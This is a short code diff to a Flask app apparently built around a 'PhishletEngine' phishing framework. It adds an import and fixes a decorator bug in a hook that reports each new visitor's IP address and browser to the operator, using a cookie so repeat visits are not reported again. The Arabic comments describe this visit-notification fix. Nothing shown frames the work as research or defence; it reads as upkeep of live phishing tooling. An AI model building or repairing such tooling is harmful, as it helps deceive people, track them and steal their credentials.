@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, make_response, redirect, url_for
+from flask import Flask, request, render_template, make_response, redirect, url_for, after_this_request
 import requests
 import logging
 import json
@@ -172,12 +172,12 @@ phishlet = PhishletEngine(
     ]
 )
 
-# إشعار الزيارة مع منع التكرار باستخدام كوكي
+# إشعار الزيارة مع منع التكرار باستخدام كوكي (تم التصحيح هنا)
 @app.before_request
 def check_visit():
     if request.path == '/' and 'visited' not in request.cookies:
         phishlet.notify_visit(request.remote_addr, request.headers.get('User-Agent', 'Unknown'))
-        @app.after_this_request
+        @after_this_request
         def set_visit_cookie(response):
             response.set_cookie('visited', '1', max_age=3600)  # ساعة واحدة
             return response
